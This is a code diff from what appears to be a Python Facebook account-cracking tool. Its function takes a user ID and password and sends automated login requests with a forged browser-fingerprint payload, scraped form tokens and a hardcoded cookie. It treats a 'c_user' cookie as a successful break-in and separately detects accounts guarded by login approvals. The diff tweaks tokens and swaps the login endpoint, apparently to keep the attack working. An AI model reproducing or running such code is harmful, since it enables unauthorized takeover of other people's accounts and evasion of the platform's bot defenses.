@@ -1746,14 +1746,14 @@ def d(uid,pwx,tl):
             'bi_xrwh': '0',
             'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wndtoStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'fb_dtsg': 'NAcPNtpBvo1jGoRJiDTJrassHd5acQC2Pp2nOTI4mdFDpVals4PlkyA:0:0',
+            'fb_dtsg': '',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1EE2Cwro0wa4o1MUaE36wdq0ny1Aw4vw8W0k-0jG3qaw4kwbS1Lw9C0hO3q0ue0QU',
+            'dyn': '',
             'csr': '',
             'req': '3',
             'fmt': '1',
-            'a': 'AYlsz79FfwTc1yBOGWQ9ZxwK3hLJKhCnjiq-naYg_qbMYNGB_kQ6UYPgUrlPOTh2Uukfy4HsehxHPCheBmPfOUBQOJsw-N8OZV9CSwxfImlEaw',
+            'a': '',
             'user': '0'}
             cookies = {
             'datr': 'QtBZZ5pdw9yXQJE0ZygUaI3n',
@@ -1785,7 +1785,7 @@ def d(uid,pwx,tl):
             "accept-encoding": "gzip, deflate, br",
             "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://m.facebook.com/login/device-based/login/async/'
+            url = 'https://m.facebook.com/login/device-based/login/async/?api_key=124024574287414&auth_token=07adf4ea7b64b7deeea58b93cba0a1e3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%252217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De5428d80-85a0-4de8-9e72-860dccbb218a%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
